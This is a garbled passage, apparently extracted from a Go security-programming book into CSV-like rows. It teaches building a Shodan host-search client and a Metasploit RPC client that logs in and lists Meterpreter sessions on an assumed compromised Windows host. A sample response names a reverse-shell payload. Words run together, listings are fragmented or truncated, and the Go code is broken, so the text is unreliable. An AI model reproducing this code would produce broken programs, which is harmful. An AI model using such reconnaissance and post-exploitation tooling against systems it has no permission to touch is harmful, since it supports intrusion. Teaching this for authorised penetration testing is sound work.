"Refertoyouroperatingsystem’susermanual,orbetteryet, ",NA,NA
lookat,NA,NA
Chapter1,NA,NA
ifyouneedhelpsettingthevariable.,NA,NA
"Beforeworkingthroughthecode,understandthatthis ",NA,NA
sectiondemonstrateshowtocreateabare-bones ,NA,NA
"implementationofaclient—notafullyfeatured, ",NA,NA
"comprehensiveimplementation.However,thebasic",NA,NA
scaffoldingyou’llbuildnowwillallowyoutoeasilyextend ,NA,NA
thedemonstratedcodetoimplementotherAPIcallsasyou ,NA,NA
mayneed.,NA,NA
TheclientyoubuildwillimplementtwoAPIcalls:oneto ,NA,NA
querysubscriptioncreditinformationandtheothertosearch ,NA,NA
forhoststhatcontainacertainstring.Youusethelattercall ,NA,NA
"foridentifyinghosts;forexample,portsoroperatingsystems ",NA,NA
matchingacertainproduct.,NA,NA
"Luckily,theShodanAPIisstraightforward,producing ",NA,NA
nicelystructuredJSONresponses.Thismakesitagood ,NA,NA
startingpointforlearningAPIinteraction.Hereisahigh-level ,NA,NA
overviewofthetypicalstepsforpreparingandbuildingan ,NA,NA
APIclient:,"1.
  Reviewtheservice’sAPIdocumentation.
  
 2.
  Designalogicalstructureforthecodeinordertoreducecomplexityand 
  
 repetition.
  
 3.
  Definerequestorresponsetypes,asnecessary,inGo.
  
 4.
  Createhelperfunctionsandtypestofacilitatesimpleinitialization, 
  
 authentication,andcommunicationtoreduceverboseorrepetitivelogic. 
 5.
  BuildtheclientthatinteractswiththeAPIconsumerfunctionsandtypes.",NA
"Wewon’texplicitlycallouteachstepinthissection,but ",NA,NA
youshouldusethislistasamaptoguideyourdevelopment.,NA,NA
StartbyquicklyreviewingtheAPIdocumentationon ,NA,NA
Shodan’swebsite.Thedocumentationisminimalbutproduce,NA,NA
s everythingneededtocreateaclientprogram.,NA,NA
DesigningtheProjectStructure,NA,NA
"WhenbuildinganAPIclient,youshouldstructureitsothat ",NA,NA
thefunctioncallsandlogicstandalone.Thisallowsyouto ,NA,NA
reusetheimplementationasalibraryinotherprojects.That ,NA,NA
"way,youwon’thavetoreinventthewheelinthefuture.",NA,NA
Buildingforreusabilityslightlychangesaproject’sstructure. ,NA,NA
"FortheShodanexample,here’stheprojectstructure:","$
 treegithub.com/blackhat-go/bhg/ch-3/shodan
  
  
 github.com/blackhat-go/bhg/ch-3/shodan
  
  
 |---cmd
  
  
 ||---shodan
  
  
 ||---main.go
  
  
 |---shodan
  
  
 |---api.go
  
  
 |---host.go
  
  
 |---shodan.go",NA
The,NA,NA
main.go,NA,NA
filedefines,packagemain,NA
andisusedprimarilyas,NA,NA
"aconsumeroftheAPIyou’llbuild;inthiscase,youuseit ",NA,NA
primarilytointeractwithyourclientimplementation.,NA,NA
Thefilesinthe,NA,NA
shodan,NA,NA
directory—,NA,NA
api.go,NA,NA
",",NA,NA
host.go,NA,NA
",and ",NA,NA
shodan.go,NA,NA
—define,packageshodan,NA
",whichcontainsthetypesand",NA,NA
functionsnecessaryforcommunicationtoandfromShodan. ,NA,NA
Thispackagewillbecomeyourstand-alonelibrarythatyou ,NA,NA
canimportintovariousprojects.,NA,NA
CleaningUpAPICalls,NA,NA
"WhenyouperusedtheShodanAPIdocumentation,youmay ",NA,NA
havenoticedthateveryexposedfunctionrequiresyoutosend ,NA,NA
yourAPIkey.Althoughyoucertainlycanpassthatvalue ,NA,NA
"aroundtoeachconsumerfunctionyoucreate,thatrepetitive ",NA,NA
taskbecomestedious.Thesamecanbesaidforeither ,NA,NA
hardcodingorhandlingthebaseURL(,NA,NA
https://api.shodan.io/,NA,NA
). ,NA,NA
"Forexample,definingyourAPIfunctions,asinthefollowing ",NA,NA
"snippet,requiresyoutopassinthetokenandURLtoeach ",NA,NA
"function,whichisn’tveryelegant:",NA,NA
"Instead,optforamoreidiomaticsolutionthatallowsyou ",NA,NA
tosavekeystrokeswhilearguablymakingyourcodemore ,NA,NA
"readable.Todothis,createa",NA,NA
shodan.go,NA,NA
fileandenterthecode ,NA,NA
in,NA,NA
Listing3-7,NA,NA
.,"packageshodan
  
  
 ❶constBaseURL=""https://api.shodan.io""
  
  
 ❷typeClientstruct{ 
  
 apiKeystring
  
  
 }
  
  
 ❸funcNew(apiKeystring)*Client{ 
 return&Client{apiKey:apiKey}
  
  
 }
  
 Listing3-7:Shodan
 Client
 definition(
 /
 ch-3/shodan/shodan/shodan.go
 )",NA
TheShodanURLisdefinedasaconstantvalue❶;that ,NA,NA
"way,youcaneasilyaccessandreuseitwithinyour ",NA,NA
implementingfunctions.IfShodaneverchangestheURLof ,NA,NA
"itsAPI,you’llhavetomakethechangeatonlythisone ",NA,NA
"locationinordertocorrectyourentirecodebase.Next,you ",NA,NA
definea,Client,NA
"struct,usedformaintainingyourAPItoken ",NA,NA
"acrossrequests❷.Finally,thecodedefinesa",New(),NA
helper ,NA,NA
"function,takingtheAPItokenasinputandcreatingand ",NA,NA
returninganinitialized,Client,NA
"instance❸.Now,ratherthan ",NA,NA
"creatingyourAPIcodeasarbitraryfunctions,youcreatethem ",NA,NA
as,NA,NA
methods,NA,NA
onthe,Client,NA
"struct,whichallowsyoutointerrogate",NA,NA
theinstancedirectlyratherthanrelyingonoverlyverbose,NA,NA
"functionparameters.YoucanchangeyourAPIfunctioncalls,",NA,NA
"whichwe’lldiscussmomentarily,tothefollowing:","func(s*Client)APIInfo(){--
 snip
 --}
  
  
 func(s*Client)HostSearch(){--
 snip
 --}",NA
Sincethesearemethodsonthe,Client,NA
"struct,youcanretrieve",NA,NA
theAPIkeythrough,s.apiKey,NA
andretrievetheURLthrough,BaseURL,NA
.Theonlyprerequisitetocallingthemethodsisthat,NA,NA
youcreateaninstanceofthe,Client,NA
structfirst.Youcandothis,NA,NA
withthe,New(),NA
helperfunctionin,NA,NA
shodan.go,NA,NA
.,NA,NA
QueryingYourShodanSubscription,NA,NA
Nowyou’llstarttheinteractionwithShodan.PertheShodan,NA,NA
"APIdocumentation,thecalltoqueryyoursubscriptionplan",NA,NA
informationisasfollows:,"https://api.shodan.io/api-info?key=
 {YOUR_API_KEY}",NA
Theresponsereturnedresemblesthefollowingstructure.,NA,NA
"Obviously,thevalueswilldifferbasedonyourplandetails",NA,NA
andremainingsubscriptioncredits.,"{
  
  
 ""query_credits"":56,
  
  
 ""scan_credits"":0,
  
  
 ""telnet"":true,
  
  
 ""plan"":""edu"",
  
  
 ""https"":true,
  
  
 ""unlocked"":true,
  
  
 }",NA
"First,in",NA,NA
api.go,NA,NA
",you’llneedtodefineatypethatcanbe",NA,NA
usedtounmarshaltheJSONresponsetoaGostruct.Without,NA,NA
"it,youwon’tbeabletoprocessorinterrogatetheresponse",NA,NA
"body.Inthisexample,namethetype",APIInfo,NA
:,"typeAPIInfostruct{
  
  
 QueryCreditsint`json:""query_credits""`
  
  
 ScanCreditsint`json:""scan_credits""`
  
  
 Telnetbool`json:""telnet""`
  
  
 Planstring`json:""plan""`
  
  
 HTTPSbool`json:""https""`
  
  
 Unlockedbool`json:""unlocked""`
  
  
 }",NA
TheawesomenessthatisGomakesthatstructureand,NA,NA
JSONalignmentajoy.Asshownin,NA,NA
Chapter1,NA,NA
",youcanuse",NA,NA
somegreattoolingto“automagically”parseJSON—,NA,NA
populatingthefieldsforyou.Foreachexportedtypeonthe,NA,NA
"struct,youexplicitlydefinetheJSONelementnamewith",NA,NA
structtagssoyoucanensurethatdataismappedandparsed,NA,NA
properly.,NA,NA
Nextyouneedtoimplementthefunctionin,NA,NA
Listing3-8,NA,NA
",",NA,NA
whichmakesanHTTPGETrequesttoShodananddecodes,NA,NA
theresponseintoyour,APIInfo,NA
struct:,"func(s*Client)APIInfo()(*APIInfo,error){ 
  
 res,err:=http.Get(fmt.Sprintf(""%s/api-
 info?key=%s"",BaseURL,s.apiKey))❶iferr!=nil{
  
 returnnil,err
  
 }
  
 deferres.Body.Close()
  
  
 varretAPIInfo 
  
 iferr:=json.NewDecoder(res.Body).Decode(&ret)❷;err!=nil{ 
 returnnil,err
  
 }
  
 return&ret,nil
  
 }",NA
Theimplementationisshortandsweet.Youfirstissuean ,NA,NA
HTTPGETrequesttothe,/api-info,NA
resource❶.ThefullURLis ,NA,NA
builtusingthe,BaseURL,NA
globalconstantand,s.apiKey,NA
.Youthen ,NA,NA
decodetheresponseintoyour,APIInfo,NA
struct❷andreturnitto ,NA,NA
thecaller.,NA,NA
"Beforewritingcodethatutilizesthisshinynewlogic,build ",NA,NA
"outasecond,moreusefulAPIcall—thehostsearch—which ",NA,NA
you’lladdto,NA,NA
host.go,NA,NA
".Therequestandresponse,accordingto ",NA,NA
"theAPIdocumentation,isasfollows:","https://api.shodan.io/shodan/host/search?key=
 {
 YOUR_API_KEY}
 &query=
  
 {query}
 &facets=
 {facets}
  
 { 
  
 ""matches"":[ 
  
 { 
  
 ""os"":null, 
  
 ""timestamp"":""2014-01-15T05:49:56.283713"", 
  
 ""isp"":""Vivacom"", 
  
 ""asn"":""AS8866"", 
  
 ""hostnames"":[], 
  
 ""location"":{ 
  
 ""city"":null, 
  
 ""region_code"":null, 
  
 ""area_code"":null, 
  
 ""longitude"":25, 
  
 ""country_code3"":""BGR"", 
  
 ""country_name"":""Bulgaria"", 
  
 ""postal_code"":null, 
  
 ""dma_code"":null, 
  
 ""country_code"":""BG"", 
  
 ""latitude"":43 
  
 },
  
 ""ip"":3579573318,",NA
"ComparedtotheinitialAPIcallyouimplemented,thisone ",NA,NA
issignificantlymorecomplex.Notonlydoestherequesttake ,NA,NA
"multipleparameters,buttheJSONresponsecontainsnested ",NA,NA
"dataandarrays.Forthefollowingimplementation,you’ll ",NA,NA
ignorethe,facets,NA
"optionanddata,andinsteadfocuson",NA,NA
performingastring-basedhostsearchtoprocessonlythe ,matches,NA
elementoftheresponse.,NA,NA
"Asyoudidbefore,startbybuildingtheGostructsto ",NA,NA
handletheresponsedata;enterthetypesin,NA,NA
Listing3-9,NA,NA
into ,NA,NA
your,NA,NA
host.go,NA,NA
file.,"typeHostLocationstruct{
  
  
 Citystring`json:""city""`
  
  
 RegionCodestring`json:""region_code""`
  
  
 AreaCodeint`json:""area_code""`",NA
Thecodedefinesthreetypes:,HostSearch,NA
Usedforparsingthe,matches,NA
array,Host,NA
Representsasingle,matches,NA
element,HostLocation,NA
Representsthe,location,NA
elementwithinthehost,NA,NA
Noticethatthetypesmaynotdefineallresponsefields.Go ,NA,NA
"handlesthiselegantly,allowingyoutodefinestructureswith",NA,NA
"onlytheJSONfieldsyoucareabout.Therefore,ourcodewill",NA,NA
"parsetheJSONjustfine,whilereducingthelengthofyour",NA,NA
codebyincludingonlythefieldsthataremostrelevanttothe ,NA,NA
"example.Toinitializeandpopulatethestruct,you’lldefinethe ",NA,NA
functionin,NA,NA
Listing3-10,NA,NA
",whichissimilartothe",APIInfo(),NA
methodyoucreatedin,NA,NA
Listing3-8,NA,NA
.,"func(s*Client)HostSearch(qstring❶)(*HostSearch,error){ 
 res,err:=http.Get(❷
  
 fmt.Sprintf(""%s/shodan/host/search?key=%s&query=%s"",BaseURL,
  
 s.apiKey,q), 
  
 ) 
  
 iferr!=nil{ 
  
 returnnil,err 
  
 }
  
 deferres.Body.Close()
  
  
 varretHostSearch 
  
 iferr:=json.NewDecoder(res.Body).Decode(&ret)❸;err!=nil{ 
 returnnil,err
  
  
 }
  
  
 return&ret,nil
  
  
 }
  
 Listing3-10:Decodingthehostsearchresponsebody(
 /ch-
 3/shodan/shodan/host.go
 )",NA
Theflowandlogicisexactlylikethe,APIInfo(),NA
"method, ",NA,NA
"exceptthatyoutakethesearchquerystringasaparameter❶, ",NA,NA
issuethecalltothe,/shodan/host/search,NA
endpointwhilepassingthe ,NA,NA
"searchterm❷,anddecodetheresponseintothe",HostSearch,NA
struct❸.,NA,NA
Yourepeatthisprocessofstructuredefinitionandfunction ,NA,NA
implementationforeachAPIserviceyouwanttointeractwith.,NA,NA
"Ratherthanwastingpreciouspageshere,we’lljumpahead",NA,NA
andshowyouthelaststepoftheprocess:creatingtheclient,NA,NA
thatusesyourAPIcode.,NA,NA
CreatingaClient,NA,NA
You’lluseaminimalisticapproachtocreateyourclient:takea,NA,NA
searchtermasacommandlineargumentandthencallthe,APIInfo(),NA
and,HostSearch(),NA
"methods,asin",NA,NA
Listing3-11,NA,NA
.,"funcmain(){
  
 iflen(os.Args)!=2{
  
 log.Fatalln(""Usage:shodan
 searchterm
 "")
  
 } 
  
 apiKey:=os.Getenv(""SHODAN_API_KEY"")❶s:=sh
 odan.New(apiKey)❷
  
 info,err:=s.APIInfo()❸
  
 iferr!=nil{
  
 log.Panicln(err)
  
 }
  
 fmt.Printf(
  
 ""QueryCredits:%d\nScanCredits:%d\n\n"",
  
 info.QueryCredits,
  
 info.ScanCredits)
  
 hostSearch,err:=s.HostSearch(os.Args[1])❹if
 err!=nil{
  
 log.Panicln(err)
  
 }
  
 ❺for_,host:=rangehostSearch.Matches{ 
  
 fmt.Printf(""%18s%8d\n"",host.IPString,host.Port)
  
 }
  
 }
  
 Listing3-11:Consumingandusingthe
 shodan
 package(
 /ch-
  
 3/shodan/cmd/shodan/main.go
 )",NA
StartbyreadingyourAPIkeyfromthe,SHODAN_API_KEY,NA
environmentvariable❶.Thenusethatvaluetoinitializea ,NA,NA
new,Client,NA
"struct❷,",s,NA
",subsequentlyusingittocallyour",APIInfo(),NA
method❸.Callthe,HostSearch(),NA
"method,passinginasearch ",NA,NA
"stringcapturedasacommandlineargument❹.Finally,loop ",NA,NA
throughtheresultstodisplaytheIPandportvaluesforthose ,NA,NA
servicesmatchingthequerystring❺.Thefollowingoutput ,NA,NA
"showsasamplerun,searchingforthestring",tomcat,NA
:,"$
 SHODAN_API_KEY=
 YOUR-KEY
 gorunmain.gotomcat
  
  
 QueryCredits:100
  
  
 ScanCredits:100
  
  
 185.23.138.1418081
  
  
 218.103.124.2398080
  
  
 123.59.14.1698081
  
  
 177.6.80.2138181
  
  
 142.165.84.16010000
  
  
 --
 snip
 --",NA
You’llwanttoadderrorhandlinganddatavalidationto ,NA,NA
"thisproject,butitservesasagoodexampleforfetchingand ",NA,NA
displayingShodandatawithyournewAPI.Younowhavea ,NA,NA
workingcodebasethatcanbeeasilyextendedtosupportand ,NA,NA
testtheotherShodanfunctions.,NA,NA
INTERACTINGWITHMETASPLOIT,NA,NA
Metasploit,NA,NA
isaframeworkusedtoperformavarietyof ,NA,NA
"adversarialtechniques,includingreconnaissance,exploitatio",NA,NA
"n, ",NA,NA
"commandandcontrol,persistence,lateralnetworkmovemen",NA,NA
"t, ",NA,NA
"payloadcreationanddelivery,privilegeescalation,andmore. ",NA,NA
"Evenbetter,thecommunityversionoftheproductisfree,runs ",NA,NA
"onLinuxandmacOS,andisactivelymaintained.Essentialfor ",NA,NA
"anyadversarialengagement,Metasploitisafundamentaltool ",NA,NA
"usedbypenetrationtesters,anditexposesa",NA,NA
remoteprocedure,NA,NA
call(RPC),NA,NA
APItoallowremoteinteractionwithits ,NA,NA
functionality.,NA,NA
"Inthissection,you’llbuildaclientthatinteractswitha ",NA,NA
remoteMetasploitinstance.MuchliketheShodancodeyou ,NA,NA
"built,theMetasploitclientyoudevelopwon’tcovera ",NA,NA
comprehensiveimplementationofallavailablefunctionality,NA,NA
". Rather,itwillbethefoundationuponwhichyoucanextend ",NA,NA
additionalfunctionalityasneeded.Wethinkyou’llfindthe ,NA,NA
"implementationmorecomplexthantheShodanexample, ",NA,NA
makingtheMetasploitinteractionamorechallenging ,NA,NA
progression.,NA,NA
SettingUpYourEnvironment,NA,NA
"Beforeyouproceedwiththissection,downloadandinstallthe ",NA,NA
Metasploitcommunityeditionifyoudon’talreadyhaveit.,NA,NA
StarttheMetasploitconsoleaswellastheRPClistener ,NA,NA
throughthe,msgrpc,NA
moduleinMetasploit.Thensettheserver,NA,NA
host—theIPonwhichtheRPCserverwilllisten—anda ,NA,NA
"password,asshownin",NA,NA
Listing3-12,NA,NA
.,"$
 msfconsole
  
  
 msf>
 loadmsgrpcPass
 =s3cr3t
 ServerHost=
 10.0.1.6
  
  
 [*]MSGRPCService:
 10.0.1.6:55552
  
  
 [*]MSGRPCUsername:
 msf
  
  
 [*]MSGRPCPassword:
 s3cr3t
  
  
 [*]Successfullyloadedplugin:msgrpc
  
 Listing3-12:StartingMetasploitandthemsgrpcserver",NA
Tomakethecodemoreportableandavoidhardcoding ,NA,NA
"values,setthefollowingenvironmentvariablestothevalues ",NA,NA
youdefinedforyourRPCinstance.Thisissimilartowhatyou ,NA,NA
didfortheShodanAPIkeyusedtointeractwithShodanin,NA,NA
“CreatingaClient”on,NA,NA
page58,NA,NA
.,"$
 exportMSFHOST=
 10.0.1.6:55552
  
  
 $
 exportMSFPASS=
 s3cr3t",NA
YoushouldnowhaveMetasploitandtheRPCserver ,NA,NA
running.,NA,NA
BecausethedetailsonexploitationandMetasploituseare ,NA,NA
"beyondthescopeofthisbook, let’sassumethatthroughpure ",1,NA
cunningandtrickeryyou’vealreadycompromisedaremote ,NA,NA
Windowssystemandyou’veleveragedMetasploit’s ,NA,NA
Meterpreterpayloadforadvancedpost-,NA,NA
exploitationactivities. ,NA,NA
"Here,youreffortswillinsteadfocusonhowyoucanremotely ",NA,NA
communicatewithMetasploittolistandinteractwith ,NA,NA
"establishedMeterpretersessions.Aswementionedbefore,thi",NA,NA
"s codeisabitmorecumbersome,sowe’llpurposelypareit ",NA,NA
backtothebareminimum—justenoughforyoutotakethe ,NA,NA
codeandextenditforyourspecificneeds.,NA,NA
FollowthesameprojectroadmapastheShodanexample: ,NA,NA
"reviewtheMetasploitAPI,layouttheprojectinlibrary ",NA,NA
"format,definedatatypes,implementclientAPIfunctions,and, ",NA,NA
"finally,buildatestrigthatusesthelibrary.",NA,NA
"First,reviewtheMetasploitAPIdeveloperdocumentatio",NA,NA
n atRapid7’sofficialwebsite ,NA,NA
(,NA,NA
https://metasploit.help.rapid7.com/docs/rpc-api/,NA,NA
).The ,NA,NA
"functionalityexposedisextensive,allowingyoutodojust ",NA,NA
aboutanythingremotelythatyoucouldthroughlocal ,NA,NA
"interaction.UnlikeShodan,whichusesJSON,Metasploit ",NA,NA
"communicatesusingMessagePack,acompactandefficient ",NA,NA
binaryformat.BecauseGodoesn’tcontainastandard ,NA,NA
"MessagePackpackage,you’lluseafull-featuredcommunity",NA,NA
implementation.Installitbyexecutingthefollowingfromthe ,NA,NA
commandline:,"$
 gogetgopkg.in/vmihailenco/msgpack.v2",NA
"Inthecode,you’llrefertotheimplementationas",msgpack,NA
.,NA,NA
Don’tworrytoomuchaboutthedetailsoftheMessagePack ,NA,NA
spec.You’llseeshortlythatyou’llneedtoknowverylittle ,NA,NA
aboutMessagePackitselftobuildaworkingclient.Goisgreat ,NA,NA
"becauseithidesalotofthesedetails,allowingyoutoinstead ",NA,NA
focusonbusinesslogic.Whatyouneedtoknowarethebasics ,NA,NA
ofannotatingyourtypedefinitionsinordertomakethem“Mes,NA,NA
"sagePack-friendly.”Beyondthat,thecodetoinitiate ",NA,NA
"encodinganddecodingisidenticaltootherformats,suchas ",NA,NA
JSONandXML.,NA,NA
"Next,createyourdirectorystructure.Forthisexample,you ",NA,NA
useonlytwoGofiles:,"$
 treegithub.com/blackhat-go/bhg/ch-3/metasploit-minimal
  
  
 github.com/blackhat-go/bhg/ch-3/metasploit-minimal
  
  
 |---client
  
  
 ||---main.go
  
  
 |---rpc
  
  
 |---msf.go",NA
The,NA,NA
msf.go,NA,NA
fileresideswithinthe,rpc,NA
"package,andyou’ll",NA,NA
use,NA,NA
client/main.go,NA,NA
toimplementandtestthelibraryyoubuild.,NA,NA
DefiningYourObjective,NA,NA
"Now,youneedtodefineyourobjective.Forthesakeof ",NA,NA
"brevity,implementthecodetointeractandissueanRPCcall ",NA,NA
thatretrievesalistingofcurrentMeterpretersessions—,NA,NA
"thatis, the",session.list,NA
methodfromtheMetasploitdeveloper,NA,NA
documentation.Therequestformatisdefinedasfollows:,"[""session.list"",""
 token
 ""]",NA
Thisisminimal;itexpectstoreceivethenameofthe ,NA,NA
methodtoimplementandatoken.The,token,NA
valueisa,NA,NA
"placeholder.Ifyoureadthroughthedocumentation,you’ll ",NA,NA
"findthatthisisanauthenticationtoken,issueduponsuccessful ",NA,NA
logintotheRPCserver.Theresponsereturnedfrom ,NA,NA
Metasploitforthe,session.list,NA
methodfollowsthisformat:,"{
  
 ""1""=>{ 
  
 'type'=>""shell"", 
  
 ""tunnel_local""=>""192.168.35.149:44444"", 
  
 ""tunnel_peer""=>""192.168.35.149:43886"", 
  
 ""via_exploit""=>""exploit/multi/handler"", 
  
 ""via_payload""=>""payload/windows/shell_reverse_tcp"", 
 ""desc""=>""Commandshell"", 
  
 ""info""=>"""", 
  
 ""workspace""=>""Project1"", 
  
 ""target_host""=>"""", 
  
 ""username""=>""root"", 
  
 ""uuid""=>""hjahs9kw"", 
  
 ""exploit_uuid""=>""gcprpj2a"", 
  
 ""routes""=>[] 
  
 }
  
 }",NA
Thisresponseisreturnedasamap:theMeterpretersession ,NA,NA
"identifiersarethekeys,andthesessiondetailisthevalue.",NA,NA
Let’sbuildtheGotypestohandleboththerequestand ,NA,NA
responsedata.,NA,NA
Listing3-13,NA,NA
definesthe,sessionListReq,NA
and,SessionListRes,NA
.,❶typesessionListReqstruct{,NA
"Youusetherequesttype,",sessionListReq,NA
"❶,toserialize ",NA,NA
structureddatatotheMessagePackformatinamanner ,NA,NA
consistentwithwhattheMetasploitRPCserverexpects—,NA,NA
"specifically,withamethodnameandtokenvalue.Noticethat ",NA,NA
therearen’tanydescriptorsforthosefields.Thedataispassed ,NA,NA
"asanarray,notamap,soratherthanexpectingdatain ",NA,NA
"key/valueformat,theRPCinterfaceexpectsthedataasa ",NA,NA
positionalarrayofvalues.Thisiswhyyouomitannotations,NA,NA
forthoseproperties—noneedtodefinethekeynames.,NA,NA
"However,bydefault,astructurewillbeencodedasamapwith ",NA,NA
thekeynamesdeducedfromthepropertynames.Todisable ,NA,NA
"thisandforcetheencodingasapositionalarray,youadda",NA,NA
specialfieldnamed_,msgpack,NA
thatutilizesthe,asArray,NA
descriptor,NA,NA
"❷,toexplicitlyinstructanencoder/decodertotreatthedataas ",NA,NA
anarray.,NA,NA
The,SessionListRes,NA
type❸containsaone-to-onemapping ,NA,NA
"betweenresponsefieldandstructproperties.Thedata,as ",NA,NA
"shownintheprecedingexampleresponse,isessentiallya ",NA,NA
nestedmap.Theoutermapisthesessionidentifiertosession ,NA,NA
"details,whiletheinnermapisthesessiondetails,represented ",NA,NA
"askey/valuepairs.Unliketherequest,theresponseisn’t ",NA,NA
"structuredasapositionalarray,buteachofthestruct ",NA,NA
propertiesusesdescriptorstoexplicitlynameandmapthedata ,NA,NA
toandfromMetasploit’srepresentation.Thecodeincludesthe ,NA,NA
"sessionidentifierasapropertyonthestruct.However,because ",NA,NA
"theactualvalueoftheidentifieristhekeyvalue,thiswillbe ",NA,NA
"populatedinaslightlydifferentmanner,soyouincludethe ",omitempty,NA
descriptor❹tomakethedataoptionalsothatit ,NA,NA
doesn’timpactencodingordecoding.Thisflattensthedataso ,NA,NA
youdon’thavetoworkwithnestedmaps.,NA,NA
RetrievingaValidToken,NA,NA
"Now,youhaveonlyonethingoutstanding.Youhaveto ",NA,NA
retrieveavalid,token,NA
"valuetouseforthatrequest.Todoso,",NA,NA
you’llissuealoginrequestforthe,auth.login(),NA
"APImethod,",NA,NA
whichexpectsthefollowing:,"[""auth.login"",""
 username
 "",""
 password
 ""]",NA
Youneedtoreplacethe,username,NA
and,password,NA
valueswith,NA,NA
whatyouusedwhenloadingthe,msfrpc,NA
moduleinMetasploit,NA,NA
duringinitialsetup(recallthatyousetthemasenvironment ,NA,NA
"variables).Assumingauthenticationissuccessful,theserver",NA,NA
"respondswiththefollowingmessage,whichcontainsan",NA,NA
authenticationtokenyoucanuseforsubsequentrequests.,"{""result""=>""success"",""
 token
 ""=>""a1a1a1a1a1a1a1a1""}",NA
Anauthenticationfailureproducesthefollowingresponse:,"{
  
  
 ""error""=>true,
  
  
 ""error_class""=>""Msf::RPC::Exception"",
  
  
 ""error_message""=>""InvalidUserIDorPassword""
  
  
 }",NA
"Forgoodmeasure,let’salsocreatefunctionalitytoexpire",NA,NA
"thetokenbyloggingout.Therequesttakesthemethodname,",NA,NA
"theauthenticationtoken,andathirdoptionalparameterthat",NA,NA
you’llignorebecauseit’sunnecessaryforthisscenario:,"[""auth.logout"",""
 token
 "",""
 logoutToken
 ""]",NA
Asuccessfulresponselookslikethis:,"{""result""=>""success""}",NA
DefiningRequestandResponseMethods,NA,NA
MuchasyoustructuredtheGotypesforthe,session.list(),NA
"method’srequestandresponse,youneedtodothesamefor",NA,NA
both,auth.login(),NA
and,auth.logout(),NA
(see,NA,NA
Listing3-14,NA,NA
).Thesame,NA,NA
"reasoningappliesasbefore,usingdescriptorstoforcerequests",NA,NA
tobeserializedasarraysandfortheresponsestobetreatedas,NA,NA
maps:,"typeloginReqstruct{
  
  
 _msgpackstruct{}`msgpack:"",asArray""`",NA
It’sworthnotingthatGodynamicallyserializesthelogin ,NA,NA
"response,populatingonlythefieldspresent,whichmeansyou ",NA,NA
canrepresentbothsuccessfulandfailedloginsbyusinga ,NA,NA
singlestructformat.,NA,NA
CreatingaConfigurationStructandanRPC ,NA,NA
Method,NA,NA
In,NA,NA
Listing3-15,NA,NA
",youtakethedefinedtypesandactuallyuse ",NA,NA
"them,creatingthenecessarymethodstoissueRPCcommands ",NA,NA
"toMetasploit.MuchasintheShodanexample,youalsodefine ",NA,NA
anarbitrarytypeformaintainingpertinentconfigurationand,NA,NA
"authenticationinformation.Thatway,youwon’thaveto ",NA,NA
explicitlyandrepeatedlypassincommonelementssuchas ,NA,NA
"host,port,andauthenticationtoken.Instead,you’llusethe ",NA,NA
typeandbuildmethodsonitsothatdataisimplicitly ,NA,NA
available.,"typeMetasploitstruct{
  
 hoststring 
  
 userstring 
  
 passstring 
  
 tokenstring
  
 }
  
  
 funcNew(host,user,passstring)*Metasploit{
  
 msf:=&Metasploit{ 
  
 host:host, 
  
 user:user, 
  
 pass:pass,
  
 }
  
  
 returnmsf
  
  
 }
  
 Listing3-15:Metasploitclientdefinition(
 /ch-3/metasploit-minimal/rpc/msf.go
 )",NA
"Nowyouhaveastructand,forconvenience,afunction ",NA,NA
named,New(),NA
thatinitializesandreturnsanewstruct.,NA,NA
PerformingRemoteCalls,NA,NA
Youcannowbuildmethodsonyour,Metasploit,NA
typeinorderto,NA,NA
performtheremotecalls.Topreventextensivecode ,NA,NA
"duplication,in",NA,NA
Listing3-16,NA,NA
",youstartbybuildingamethod ",NA,NA
"thatperformstheserialization,deserialization,andHTTP ",NA,NA
communicationlogic.Thenyouwon’thavetoincludethis ,NA,NA
logicineveryRPCfunctionyoubuild.,NA,NA
The,send(),NA
methodreceivesrequestandresponseparamete,NA,NA
rs oftype,interface{},NA
❶.Usingthisinterfacetypeallowsyouto ,NA,NA
"passanyrequeststructintothemethod,andsubsequently ",NA,NA
serializeandsendtherequesttotheserver.Ratherthan ,NA,NA
"explicitlyreturningtheresponse,you’llusethe",resinterface{},NA
parametertopopulateitsdatabywritingadecodedHTTP ,NA,NA
responsetoitslocationinmemory.,NA,NA
"Next,usethe",msgpack,NA
librarytoencodetherequest❷.The ,NA,NA
"logictodothismatchesthatofotherstandard,structureddata ",NA,NA
types:firstcreateanencodervia,NewEncoder(),NA
andthencallthe,Encode(),NA
method.Thispopulatesthe,buf,NA
variablewith,NA,NA
MessagePack-encodedrepresentationoftherequeststruct.,NA,NA
"Followingtheencoding,youbuildthedestinationURLby ",NA,NA
usingthedatawithinthe,Metasploit,NA
"receiver,",msf,NA
❸.Youusethat ,NA,NA
"URLandissueaPOSTrequest,explicitlysettingthecontent",NA,NA
typeto,binary/message-pack,NA
andsettingthebodytotheserialized ,NA,NA
"data❹.Finally,youdecodetheresponsebody❺.Asalluded ",NA,NA
"toearlier,thedecodeddataiswrittentothememorylocation",NA,NA
oftheresponseinterfacethatwaspassedintothemethod.The ,NA,NA
encodinganddecodingofdataisdonewithouteverneedingto ,NA,NA
"explicitlyknowtherequestorresponsestructtypes,making ",NA,NA
"thisaflexible,reusablemethod.",NA,NA
In,NA,NA
Listing3-17,NA,NA
",youcanseethemeatofthelogicinallits ",NA,NA
glory.,"func(msf*Metasploit)Login()❶error{ 
 ctx:=&loginReq{
  
 Method:""auth.login"", 
  
 Username:msf.user, 
  
 Password:msf.pass, 
  
 }
  
 varresloginRes 
  
 iferr:=msf.send(ctx,&res)❷;err!=nil{ 
 returnerr
  
 } 
  
 msf.token=res.Token 
  
 returnnil 
  
 }
  
 func(msf*Metasploit)Logout()❸error{ 
 ctx:=&logoutReq{
  
 Method:""auth.logout"", 
  
 Token:msf.token, 
  
 LogoutToken:msf.token, 
  
 }
  
 varreslogoutRes 
  
 iferr:=msf.send(ctx,&res)❹;err!=nil{ 
 returnerr
  
 } 
  
 msf.token="""" 
  
 returnnil
  
 }",NA
Youdefinethreemethods:,Login(),NA
"❶,",Logout(),NA
"❸,and ",SessionList(),NA
❺.Eachmethodusesthesamegeneralflow:create ,NA,NA
"andinitializearequeststruct,createtheresponsestruct,and ",NA,NA
callthehelperfunction❷❹❼tosendtherequestandreceive ,NA,NA
thedecodedresponse.The,Login(),NA
and,Logout(),NA
methods,NA,NA
manipulatethe,token,NA
property.Theonlysignificantdifference,NA,NA
betweenmethodlogicappearsinthe,SessionList(),NA
"method,where ",NA,NA
youdefinetheresponseasa,map[uint32]SessionListRes,NA
❻andloop ,NA,NA
"overthatresponsetoflattenthemap❽,settingthe",ID,NA
property ,NA,NA
onthestructratherthanmaintainingamapofmaps.,NA,NA
Rememberthatthe,session.list(),NA
RPCfunctionrequiresavalid,NA,NA
